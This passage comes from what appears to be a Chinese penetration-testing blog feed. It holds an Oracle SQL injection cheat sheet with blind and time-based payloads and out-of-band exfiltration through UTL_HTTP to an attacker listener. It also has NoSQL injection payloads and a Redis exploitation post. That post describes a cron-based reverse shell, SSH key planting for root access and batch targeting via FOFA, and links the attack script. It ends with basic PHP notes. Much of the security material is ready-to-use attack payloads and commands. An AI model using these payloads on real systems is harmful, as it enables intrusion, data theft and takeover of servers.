<th align="left">语句</th>
</tr>
</thead>
<tbody><tr>
<td align="left">判断用户名</td>
<td align="left"><code>and (instr((select user from dual),&#39;T&#39;))--</code> <br><br>或 <br><code>and(instr((select (select owner from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables)) where limit=1) from dual),&#39;T&#39;))--</code></td>
</tr>
<tr>
<td align="left">判断表名</td>
<td align="left"><code>and (instr((select (select table_name from (select table_name,rownum as limit from (select distinct(table_name) from user_tables)) where limit=1) from dual),&#39;T&#39;))--</code></td>
</tr>
<tr>
<td align="left">判断列名</td>
<td align="left"><code>and (instr((select (select column_name from (select column_name,rownum as limit from (select distinct(column_name) from user_tab_columns where table_name=&#39;表名&#39;)) where limit=1) from dual),&#39;T&#39;))--</code></td>
</tr>
<tr>
<td align="left">判断数据</td>
<td align="left"><code>and (instr((select (select AGE from (select AGE,rownum as limit from (select * from 列名)) where limit=1) from dual),&#39;T&#39;))--</code></td>
</tr>
</tbody></table>
<h1 id="四、延时盲注"><a href="#四、延时盲注" class="headerlink" title="四、延时盲注"></a>四、延时盲注</h1><p>相关函数</p>
<table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">语句</th>
</tr>
</thead>
<tbody><tr>
<td align="left">decode()</td>
<td align="left"><code>decode(condition,value,dbms_pipe.receive_message(&#39;ICQ&#39;,5),0)</code></td>
</tr>
<tr>
<td align="left">DBMS_PIPE.RECEIVE_MESSAGE()</td>
<td align="left"><code>DBMS_PIPE.RECEIVE_MESSAGE(&#39;任意值&#39;,延迟时间) </code><br><code>and dbms_pipe.receive_message(&#39;ICQ&#39;,5)=1</code></td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">语句</th>
</tr>
</thead>
<tbody><tr>
<td align="left">判断用户名</td>
<td align="left"><code>and(select decode(substr(user,1,1),&#39;T&#39;,dbms_pipe.receive_message(&#39;ICQ&#39;,3),0)from dual)=1--</code> <br>或 <br><code>and(select decode(substr((select owner from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables)) where limit=1),1,1),’T’,dbms_pipe.receive_message(&#39;ICQ&#39;,3),0)from dual)=1--</code></td>
</tr>
<tr>
<td align="left">判断表名</td>
<td align="left"><code>and(select decode(substr((select table_name from (select table_name,rownum as limit from (select distinct(table_name) from user_tables)) where limit=1),1,1),&#39;T&#39;,dbms_pipe.receive_message(&#39;ICQ&#39;,3),0)from dual)=1--</code></td>
</tr>
<tr>
<td align="left">判断列名</td>
<td align="left"><code>and(select decode(substr((select column_name from (select column_name,rownum as limit from (select distinct(column_name) from user_tab_columns where table_name=&#39;表名&#39;)) where limit=1),1,1),&#39;T&#39;,dbms_pipe.receive_message(&#39;ICQ&#39;,3),0)from dual)=1--</code></td>
</tr>
<tr>
<td align="left">判断数据</td>
<td align="left"></td>
</tr>
</tbody></table>
<h1 id="五、DNS外带"><a href="#五、DNS外带" class="headerlink" title="五、DNS外带"></a>五、DNS外带</h1><p>DNS外带函数</p>
<table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">UTL_HTTP.REQUEST</td>
<td align="left">用于取得web服务器的请求信息 <br><code>select UTL_HTTP.REQUEST(&#39;http://www.baidu.com&#39;) from dual</code> <br>返回百度的html源码</td>
</tr>
<tr>
<td align="left">UTL_INADDR.GET_HOST_ADDRESS</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">SYS.DBMS_LDAP.INIT</td>
<td align="left"></td>
</tr>
</tbody></table>
<p>外带注入过程</p>
<table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">语句</th>
</tr>
</thead>
<tbody><tr>
<td align="left">检测函数是否可用</td>
<td align="left"><code>and exists(select count(*) from all_objects where object_name=&#39;UTL_HTTP&#39;)--</code> <br>回显正常则可用</td>
</tr>
<tr>
<td align="left">开启本地监听</td>
<td align="left"><code>python -m http.server 1111</code></td>
</tr>
<tr>
<td align="left">反弹信息</td>
<td align="left">`and UTL_HTTP.request(‘<a href="http://ip:监听端口/&#39;">http://ip:监听端口/&#39;</a></td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Web渗透</category>
      </categories>
      <tags>
        <tag>Oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>Nosql注入</title>
    <url>/article/Nosql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>泛指非关系型的数据库，多和关系型数据库共存</p>
<p>特点：</p>
<p>不要预定义表，可以存储非结构化数据，数据量大，用于模糊处理，使用灵活，可拓展等</p>
<p>代表数据库：</p>
<p>MongoDB（默认端口号27017）、Redis（默认端口号：6379）、Memcache</p>
<p>数据类型：</p>
<table>
<thead>
<tr>
<th align="left">类型</th>
<th align="left">用法</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">布尔型</td>
<td align="left">{“a”:true}</td>
<td align="left">与java的boolean一样</td>
</tr>
<tr>
<td align="left">Null</td>
<td align="left">{“a”:null}</td>
<td align="left">null表示空值或者不存在的字段</td>
</tr>
<tr>
<td align="left">数值</td>
<td align="left">{“a”:1.34}{“a”:NumberInt(“3”)} 表示4字节的整数</td>
<td align="left">不区分整数或浮点</td>
</tr>
<tr>
<td align="left">字符串</td>
<td align="left">{“a”:”string”}</td>
<td align="left">UTF-8的字符串</td>
</tr>
<tr>
<td align="left">日期</td>
<td align="left">{“a”:newDate()}</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">数组</td>
<td align="left">{“a”:[“b”,”c”,”d”]}</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">内嵌文档</td>
<td align="left">{“a”:{“b”:”c”:”d”}}</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">对象id</td>
<td align="left">{“a”:ObjectID()}</td>
<td align="left">对象id一个12字节的ID，文档的唯一表示，对象的默认主键_id就是一个对象id</td>
</tr>
</tbody></table>
<h1 id="MongoDB操作"><a href="#MongoDB操作" class="headerlink" title="MongoDB操作"></a>MongoDB操作</h1><table>
<thead>
<tr>
<th align="left">操作</th>
<th align="left">语句</th>
</tr>
</thead>
<tbody><tr>
<td align="left">开启服务</td>
<td align="left">sudo mongod</td>
</tr>
<tr>
<td align="left">登陆mongodb数据库</td>
<td align="left">mongo –host 127.0.0.1</td>
</tr>
</tbody></table>
<p>数据库的操作</p>
<table>
<thead>
<tr>
<th align="left">操作</th>
<th align="left">语句</th>
</tr>
</thead>
<tbody><tr>
<td align="left">查看所有的数据库</td>
<td align="left">show dbs</td>
</tr>
<tr>
<td align="left">切换数据库</td>
<td align="left">use 数据库名</td>
</tr>
<tr>
<td align="left">查看集合</td>
<td align="left">show collections</td>
</tr>
<tr>
<td align="left">数据库的创建</td>
<td align="left">user数据库名。有值自动创建，当use的时候，系统就会自动创建一个数据库。</td>
</tr>
<tr>
<td align="left">删除数据库</td>
<td align="left">进入数据库后db.dropDatabase(); 注意：如果没有选择任何数据库，会删除默认的test数据库</td>
</tr>
</tbody></table>
<p>集合的操作</p>
<table>
<thead>
<tr>
<th align="left">操作</th>
<th align="left">语句</th>
</tr>
</thead>
<tbody><tr>
<td align="left">查看集合</td>
<td align="left">show collections</td>
</tr>
<tr>
<td align="left">创建集合</td>
<td align="left">db.createCollection(“xxx”)</td>
</tr>
<tr>
<td align="left">删除集合</td>
<td align="left">db.xxx.drop()</td>
</tr>
</tbody></table>
<p>文档(行)的增删改</p>
<table>
<thead>
<tr>
<th align="left">操作</th>
<th align="left">语句</th>
</tr>
</thead>
<tbody><tr>
<td align="left">增加数据</td>
<td align="left">db.xx.insert({key:value}) <br>举例：<br>db.ichunqiu.insert({_id:1,name:”web”,age:10})</td>
</tr>
<tr>
<td align="left">删除数据</td>
<td align="left">db.xx.remove(删除的条件) <br>1、全部删除： <br>db.xx.remove({})  <br>2、根据条件删除，默认是删除所有符合条件的数据： <br>db.xx.remove({age:10})  <br>3、只删除符合条件的第一个： <br>db.xx.remove({gender:true},{justOne:true})</td>
</tr>
<tr>
<td align="left">更改操作</td>
<td align="left">db.xx.update({查找的条件}，{修改的内容}) <br>1、修改内容： <br>默认其他原有字段删除了，替换掉原有数据db.xx.update({age:10},{name:”NoSQL ”})  <br>2、保持原有的字段，加一个修饰$set： <br>默认只修改第一个且对已存在的原有属性是替换，不存在的属性是添加db.stu.update({age:10},{$set:{like:“study”}}) <br>说明：把like:”study”添加到数据里面，并不是替换</td>
</tr>
</tbody></table>
<p>文档查询简单语句：</p>
<table>
<thead>
<tr>
<th align="left">操作</th>
<th align="left">语句</th>
</tr>
</thead>
<tbody><tr>
<td align="left">基本查询</td>
<td align="left">db.xx.find({查询条件}) <br>1、查询所有的数据： <br>db.xx.find() 或db.xx.find({})  <br>2、默认查出所有符合条件的数据： <br>db.xx.find({age:10})  <br>3、查找符合条件的第一个： <br>db.xx.findOne({age:10})  <br>4、格式化输出——pretty()函数： <br>db.xx.find({age:10}).pretty()</td>
</tr>
<tr>
<td align="left">条件查询</td>
<td align="left">举例： <br>db.xx.find({age:{$lt:20}}) 查询年龄小于20岁的 <br>db.xx.find({age:{$ne:18}}) 查询年龄不等于18的</td>
</tr>
<tr>
<td align="left">逻辑运算</td>
<td align="left">$and，$or <br>1、$and： <br>默认的的查询条件就是且的关系 <br>举例： <br>db.xx.find({age:28,gender:true})db.xx.find({$and:[{age:28},{gender:true}]}) 查询年龄是28岁且性别为女  <br>2、$or：<br>或的关系 举例：<br>db.xx.find({$or:[{age:{$lt:30}},{gender:false}]}) 查询年龄小于30岁，或者性别为男</td>
</tr>
</tbody></table>
<p>条件查询–常用条件：</p>
<table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">字符</th>
</tr>
</thead>
<tbody><tr>
<td align="left">$lt</td>
<td align="left">&lt;</td>
</tr>
<tr>
<td align="left">$ne</td>
<td align="left">!=</td>
</tr>
<tr>
<td align="left">$or</td>
<td align="left">or</td>
</tr>
<tr>
<td align="left">$lte</td>
<td align="left">&lt;=</td>
</tr>
<tr>
<td align="left">$in</td>
<td align="left">in</td>
</tr>
<tr>
<td align="left">$not</td>
<td align="left">反匹配(1.3.3及以上版本)</td>
</tr>
<tr>
<td align="left">$gt</td>
<td align="left">&gt;</td>
</tr>
<tr>
<td align="left">$nint</td>
<td align="left">not in</td>
</tr>
<tr>
<td align="left">$regex</td>
<td align="left">正则</td>
</tr>
<tr>
<td align="left">$gte</td>
<td align="left">&gt;=</td>
</tr>
<tr>
<td align="left">$all</td>
<td align="left">all</td>
</tr>
</tbody></table>
<h1 id="Nosql注入"><a href="#Nosql注入" class="headerlink" title="Nosql注入"></a>Nosql注入</h1><table>
<thead>
<tr>
<th align="left">分类</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">综合分类（4种）</td>
<td align="left">重言式/永真式（重要） <br>JavaScript注入（难度较大） <br>联合查询注入（被淘汰） <br>mongo shell拼接注入（难度中等，危害大）</td>
</tr>
<tr>
<td align="left">语言、代码逻辑角度分类（3种）</td>
<td align="left">PHP数组注入<br> JS注入 <br>Mongo shell拼接注入</td>
</tr>
<tr>
<td align="left">攻击手段角度分类（3种）</td>
<td align="left">重言式（永真式） <br>联合查询<br> JavaScript注入</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="left">分类</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">重言式/永真式</td>
<td align="left"><code>/login.php?username[$ne]=1&amp;password[$ne]=1</code> <br>防御： <br>可以通过函数is_array()将输入参数转变为字符串类型来解决 <br>如：<br><code>db-&gt;logins-&gt;find(array(&quot;username&quot;=&gt;(string)$_POST[&quot;username&quot;],&quot;password&quot;=&gt;(string)$_POST[&quot;password&quot;])); </code><br><br>注意： <br>1、必须要结合PHP语言才能导致重言式注入（依据PHP语言的特性） <br>2、如果是POST方法传参，可以结合BurpSuite抓包、改包进行绕过。 <br>3、使用正则表达式,也可以构造永真式如：<br><code>username[$regex]=.?&amp;password[$regex]=.?</code><br>.?为匹配所有字符串<br>变为 <code>?username[$regex]=^a&amp;password[$regex]=.? </code><br>不断爆破a即可，^ab…直到爆不出，爆破字符为数字字母符号，符号需要转义</td>
</tr>
<tr>
<td align="left">JavaScript注入</td>
<td align="left"><code>&#39;;return true;var a=&#39;</code> <br>注入产生的原因 <br>1、MongoDB中$where操作符是可以执行JavaScript语句的。 <br>2、在PHP语言中是不能直接写入JavaScript语句的，需要写在字符串中。使用字符串就会引用到单引号和双引号，因此容易出现闭合的问题 <br>3、在MongoDB 2.4之前，通过$where操作符使用map-reduce、group命令可以访问到mongo shell中的全局函数和属性。也就是说可以操作数据库中的数据。  <br><br>注意： <br>1、闭合的方法有很多，只要return的值为真即可。 <br>2、该注入方法较难，主要是因为payload不易构造，在有源码的情况下容易构造闭合语句，没有源码只能猜测。 <br>3、$where执行的JavaScript语句只能进行简单的逻辑操作。</td>
</tr>
<tr>
<td align="left">mongo shell拼接注入</td>
<td align="left"><code>&quot;&#125;);db.表名.insert(&#123;&quot;name&quot;:&quot;hi&quot;&#125;);db.表名.find(&#123;&quot;author&quot;:&quot;1 </code><br>在两个db.message.find中间的位置，插入任意想要执行的代码  <br>产生的原因： <br>PHP中，通过executeCommand可以执行shell命令，可以直接执行语句。同样是存在字符串拼接的问题，因此通过使用单引号、双引号构造闭合语句，就可以执行任意的语句。</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Web渗透</category>
      </categories>
      <tags>
        <tag>Nosql</tag>
      </tags>
  </entry>
  <entry>
    <title>Pocsuite3重写redis脚本</title>
    <url>/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<h1 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h1><p>本脚本只做学习使用，请勿用作非法用途！</p>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>结合pocsuite3所学，重写redis漏洞复现。内含PoC模块、attack模块和shell模块。密码爆破功能请继续使用旧版本：<code>redis.py</code></p>
<p>其中，shell模式下会报错，但是不影响命令写入和反弹shell（反弹sell需要手动监听6666端口–pocsuite默认监听端口）。这里的报错导致脚本本身的监听出错了，只要手动开启监听就可以。</p>
<pre class="highlight"><span class="line">[ERROR] thread MainThread: &#x27;NoneType&#x27; object has no attribute &#x27;params&#x27;</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;c:\python\python39\lib\site-packages\pocsuite3\lib\core\threads.py&quot;, line 47, in run_threads</span><br><span class="line">    thread_function(*args)</span><br><span class="line">  File &quot;c:\python\python39\lib\site-packages\pocsuite3\lib\controller\controller.py&quot;, line 148, in task_run</span><br><span class="line">    result = poc_module.execute(target, headers=conf.http_headers, mode=conf.mode, verbose=False)</span><br><span class="line">  File &quot;c:\python\python39\lib\site-packages\pocsuite3\lib\core\poc.py&quot;, line 229, in execute</span><br><span class="line">    output.params = self.params</span><br><span class="line">AttributeError: &#x27;NoneType&#x27; object has no attribute &#x27;params&#x27;</span><br></pre>

<p>搜了一下，应该是某个值为空，然后空值被调用了，导致报错。但是我的shell里面没写空值，看报错，也都是系统函数报错的，盲猜可能是不会使用pocsuite3的shell模块导致的。有了解的大佬请留言指正，感谢！</p>
<hr>
<p>分割线 2021-08-14</p>
<hr>
<p>修复反弹shell空值报错；优化attack模块，改写脚本为ssh连接</p>
<p><strong>使用须知：</strong></p>
<pre class="highlight"><span class="line">attack模式下：</span><br><span class="line">需要redis-cli客户端命令</span><br><span class="line">安装：</span><br><span class="line">	wget http://download.redis.io/redis-stable.tar.gz #下载redis-cli</span><br><span class="line">	tar -zxvf redis-stable.tar.gz</span><br><span class="line">	cd redis-stable </span><br><span class="line">	make </span><br><span class="line">	cp src/redis-cli /usr/bin/</span><br><span class="line"></span><br><span class="line">需要提前在本地生成公钥文件</span><br><span class="line">方法：</span><br><span class="line">	1、ssh-keygen -t rsa  生成密钥（管理员权限）</span><br><span class="line">	2、(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt</span><br><span class="line">	3、在公钥目录执行命令，并将key.txt移动到脚本目录</span><br><span class="line">	注：windows在用户目录/.ssh下，linux在/root/.ssh/下</span><br></pre>



<p><strong>使用过程：</strong></p>
<p>1、<code>--verify </code>    验证模式</p>
<pre class="highlight"><span class="line">pocsuite -r _89715_redis_login_bypass.py -u 192.168.21.237 --verify</span><br></pre>

<p> <img src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814221643832.png" alt="image-20210814221643832" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814221643832.png" class="lozad post-image"></p>
<p>2、<code>--shell</code>    反弹shell</p>
<pre class="highlight"><span class="line">pocsuite -r _89715_redis_login_bypass.py -u 192.168.21.237 --shell</span><br></pre>

<p> <img src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814222129814.png" alt="image-20210814222129814" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814222129814.png" class="lozad post-image"></p>
<p>需要等待反弹shell定时任务生效，约1分钟</p>
<p> <img src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814222420607.png" alt="image-20210814222420607" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814222420607.png" class="lozad post-image"></p>
<pre class="highlight"><span class="line">list:列出反弹shell列表</span><br><span class="line">use:使用指定反弹shell</span><br></pre>



<p>3、ssh连接</p>
<pre class="highlight"><span class="line">pocsuite -r _89715_redis_login_bypass.py -u 192.168.21.237 --attack</span><br></pre>

<p> <img src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814223217104.png" alt="image-20210814223217104" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814223217104.png" class="lozad post-image"></p>
<p>执行<code>ssh root@192.168.21.237</code>，成功无密码连接靶机</p>
<p> <img src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814223320023.png" alt="image-20210814223320023" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814223320023.png" class="lozad post-image"></p>
<p>可搭配fofa搜索，导出目标列表，批量验证。</p>
<pre class="highlight"><span class="line">pocsuite -r _89715_redis_login_bypass.py -f ./test.txt --threads 20 --verify</span><br></pre>

<p> <img src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814223939569.png" alt="image-20210814223939569" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814223939569.png" class="lozad post-image"></p>
<p>警告！</p>
<p>shell、attack模式严禁用于非法用途，仅做本地测试及pocsuite编写学习！</p>
<p>下载地址：</p>
<p>旧版（爆破功能）</p>
<p><a href="https://www.zerochen.top/download/Redis/redis.py">https://www.zerochen.top/download/Redis/redis.py</a></p>
<p>新版（pocsuite3模块）</p>
<p><del><a href="https://www.zerochen.top/download/Redis/89715_redis_login_bypass.py">https://www.zerochen.top/download/Redis/89715_redis_login_bypass.py</a></del></p>
<p><a href="https://www.zerochen.top/download/Redis/_89715_redis_login_bypass.py">https://www.zerochen.top/download/Redis/_89715_redis_login_bypass.py</a></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP基础</title>
    <url>/article/PHP%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p>PHP是嵌入式编程语言，嵌入到HTML中，可以是任何位置。</p>
<table>
<thead>
<tr>
<th align="left">介绍</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">语法</td>
<td align="left">短标签（需要开启short_open_tag=on）</td>
</tr>
<tr>
<td align="left">注释</td>
<td align="left"># 单行注释 // 单行注释 /**/ 多行注释</td>
</tr>
<tr>
<td align="left">变量定义</td>
<td align="left">$a 不能以数字开头</td>
</tr>
<tr>
<td align="left">换行</td>
<td align="left">echo “<strong>“;</strong></td>
</tr>
<tr>
<td align="left">输入</td>
<td align="left">$a = fgets(STDIN);</td>
</tr>
<tr>
<td align="left">输出</td>
<td align="left">echo $a; printf($a); die($a); 执行完退出 exit($a); 执行完退出</td>
</tr>
<tr>
<td align="left">php数据类型</td>
<td align="left">整型 浮点型 字符串 bool型 null型 数组 对象 $a = new PDO(‘mysql://127.0.0.1’);</td>
</tr>
<tr>
<td align="left">字符串连接</td>
<td align="left">. 字符串、整型、浮点型等 .= 用于字符串追加</td>
</tr>
<tr>
<td align="left">单双引号</td>
<td align="left">“” 解析特殊字符（如变量） ‘’ 不解析特殊字符 或者斜杠转义</td>
</tr>
<tr>
<td align="left">比较</td>
<td align="left">== 值比较 === 类型比较</td>
</tr>
<tr>
<td align="left">逻辑运算符</td>
<td align="left">and &amp;&amp; 与运算，双true为true <br>or || 或运算，单true则true <br>xor 异或，有且仅有一个true为true <br>! 非，不为true则true</td>
</tr>
<tr>
<td align="left">三元运算符</td>
<td align="left">condition?value of true:value of false</td>
</tr>
<tr>
<td align="left">条件判断</td>
<td align="left">if(){ }elseif(){ }else{ }</td>
</tr>
</tbody></table>
<p>循环</p>
<table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">while</td>
<td align="left">while循环</td>
</tr>
<tr>
<td align="left">for</td>
<td align="left">for循环</td>
</tr>
<tr>
<td align="left">foreach($a as $i)</td>
<td align="left">用i在a中遍历</td>
</tr>
</tbody></table>
<p>数组</p>
<table>
<thead>
<tr>
<th align="left">说明</th>
<th align="left">函数</th>
</tr>
</thead>
<tbody><tr>
<td align="left">索引数组</td>
<td align="left">$a=array(1,’二’,3,4); $a[1];</td>
</tr>
<tr>
<td align="left">关联数组</td>
<td align="left">$a=[ ‘uname’=&gt;’zs’, ‘age’=&gt;18 ]; echo $a[‘age’];</td>
</tr>
<tr>
<td align="left">混合数组</td>
<td align="left">$a=[ ‘hello’, ‘age’=&gt;18, 123, ‘pass’=&gt;’123456’, 456 ]; a[1]=123 a[‘age’]=18 <br>注意，指向不占下标顺序</td>
</tr>
</tbody></table>
<p>数组增删</p>
<table>
<thead>
<tr>
<th align="left">说明</th>
<th align="left">函数</th>
</tr>
</thead>
<tbody><tr>
<td align="left">追加</td>
<td align="left">$a[‘w’]=’q’ 赋值追加 array_push($a,’a’)</td>
</tr>
<tr>
<td align="left">删除</td>
<td align="left">array_pop($a); 删除数组最后一个元素</td>
</tr>
</tbody></table>
<p>数组排序</p>
<table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">sort()</td>
<td align="left">升序排序</td>
</tr>
<tr>
<td align="left">rsort()</td>
<td align="left">降序排序</td>
</tr>
<tr>
<td align="left">ksort()</td>
<td align="left">根据键升序排序</td>
</tr>
<tr>
<td align="left">krsort()</td>
<td align="left">根据键降序排序</td>
</tr>
<tr>
<td align="left">asort()</td>
<td align="left">根据值，升序排序</td>
</tr>
<tr>
<td align="left">arsort()</td>
<td align="left">根据值，降序排序</td>
</tr>
</tbody></table>
<p>注：排序操作会改变原来数组</p>
<p>遍历输出</p>
<p>for($i=0;$i&lt;sizeof($a);$i++){</p>
<p>echo $a[$i];</p>
<p>}</p>
<p>foreach ($a as $key=&gt;$value)</p>
<p>函数</p>
<table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">var_dump()</td>
<td align="left">输出详细信息</td>
</tr>
<tr>
<td align="left">strlen()</td>
<td align="left">判断字符串长度</td>
</tr>
<tr>
<td align="left">trim()</td>
<td align="left">去除两侧空字符串，清理数据</td>
</tr>
<tr>
<td align="left">intval()</td>
<td align="left">把字符串转为整型</td>
</tr>
<tr>
<td align="left">count()、sizeof()</td>
<td align="left">返回数组长度</td>
</tr>
<tr>
<td align="left">empty()</td>
<td align="left">检查变量是否为空</td>
</tr>
<tr>
<td align="left">gettype()</td>
<td align="left">获取变量类型</td>
</tr>
<tr>
<td align="left">is_array()</td>
<td align="left">检查变量是否为数组类型</td>
</tr>
<tr>
<td align="left">isset()</td>
<td align="left">检查变量是否被设置或赋值</td>
</tr>
<tr>
<td align="left">unset()</td>
<td align="left">释放变量</td>
</tr>
<tr>
<td align="left">substr()</td>
<td align="left">截取字符串,起点-长度</td>
</tr>
<tr>
<td align="left">strstr()</td>
<td align="left">截取字符串，起点-结尾</td>
</tr>
<tr>
<td align="left">md5()</td>
<td align="left">计算字符串MD5值</td>
</tr>
<tr>
<td align="left">time()</td>
<td align="left">获取当前时间（元年计数法，秒）</td>
</tr>
<tr>
<td align="left">date(“Y-m-d H:i:s”,time())</td>
<td align="left">将时间戳转化为日期格式</td>
</tr>
<tr>
<td align="left">feof()</td>
<td align="left">检查文件是否读取至文件末，常用于判断文件是否读取完毕</td>
</tr>
<tr>
<td align="left">explode()</td>
<td align="left">分割字符串 explode(‘::’,$line)</td>
</tr>
<tr>
<td align="left">str_ireplace()</td>
<td align="left">替换字符串，不区分大小写 <br>str_ireplace($search, $replace, $str); <br>在str中将replace替换为search</td>
</tr>
</tbody></table>
<p>文件操作</p>
<table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">fread()</td>
<td align="left">读取整个文件或指定长度的字符串，可用于二进制文件读取</td>
</tr>
<tr>
<td align="left">fgets()</td>
<td align="left">读取文件中的一行</td>
</tr>
<tr>
<td align="left">fgetss()</td>
<td align="left">读取文件中的一行，并去掉所有HTML、PHP标记</td>
</tr>
<tr>
<td align="left">fgetc()</td>
<td align="left">读取文件中的一个字节</td>
</tr>
<tr>
<td align="left">file()</td>
<td align="left">将文件读取到数组</td>
</tr>
<tr>
<td align="left">file_get_contents()</td>
<td align="left">无需打开文件及关闭文件，读取文件全部内容到字符串，文件不存在则自动创建</td>
</tr>
<tr>
<td align="left">file_put_contents()</td>
<td align="left">将字符串内容写入文件，文件不存在则自动创建</td>
</tr>
<tr>
<td align="left">copy()</td>
<td align="left">复制文件</td>
</tr>
<tr>
<td align="left">unlink()</td>
<td align="left">删除文件</td>
</tr>
<tr>
<td align="left">rename()</td>
<td align="left">重命名文件或目录，或移动文件</td>
</tr>
<tr>
<td align="left">ftruncate()</td>
<td align="left">将文件截断到指定长度</td>
</tr>
<tr>
<td align="left">file_exits()</td>
<td align="left">判断文件或文件夹是否存在</td>
</tr>
<tr>
<td align="left">filesize()</td>
<td align="left">只读，返回文件大小</td>
</tr>
<tr>
<td align="left">filetype()</td>
<td align="left">只读，返回文件类型，如文件或文件夹</td>
</tr>
<tr>
<td align="left">filectime()</td>
<td align="left">返回文件创建时间的时间戳</td>
</tr>
<tr>
<td align="left">filemtime()</td>
<td align="left">只读，返回文件的修改时间</td>
</tr>
<tr>
<td align="left">realpath()</td>
<td align="left">返回文件的物理路径</td>
</tr>
<tr>
<td align="left">pathinfo()</td>
<td align="left">以数组形式返回文件的路径和文件名信息</td>
</tr>
</tbody></table>
<p><strong>类和对象</strong></p>
<p>类：同样特征和行为的对象的集合</p>
<p>类中变量=&gt;属性</p>
<p>类中函数=&gt;方法</p>
<p>对象=&gt;类的实例化</p>
<table>
<thead>
<tr>
<th align="left">说明</th>
<th align="left">函数</th>
</tr>
</thead>
<tbody><tr>
<td align="left">类的声明</td>
<td align="left">class Person{ <br>var 属性1; <br>var 属性2; <br>function name1(){ //方法1 } <br>function name2(){ //方法2 } }</td>
</tr>
<tr>
<td align="left">类的使用</td>
<td align="left">$a=new Person; <br>实例化对象 <br><br>$a-&gt;name=’小马’; <br>对象属性赋值 <br><br>$a-&gt;say(); <br>对象方法调用</td>
</tr>
</tbody></table>
<p>文件处理</p>
<p>$a = fopen(‘1.txt’,’a’) 以a方式打开文件</p>
<p>fclose($a) 关闭文件</p>
<p>打开文件方式</p>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">r</td>
<td align="left">只读打开，文件不存在则出错</td>
</tr>
<tr>
<td align="left">w</td>
<td align="left">写入方式打开，游标指向文件头，文件不存在则创建</td>
</tr>
<tr>
<td align="left">a</td>
<td align="left">以追加方式打开，游标指向文件末，文件不存在则创建</td>
</tr>
<tr>
<td align="left">b</td>
<td align="left">以二进制方式打开文件，可与r、w、a合用</td>
</tr>
<tr>
<td align="left">r+</td>
<td align="left">读写方式打开，游标指向文件头</td>
</tr>
<tr>
<td align="left">w+</td>
<td align="left">读写方式打开，游标指向文件头，并删除文件内容</td>
</tr>
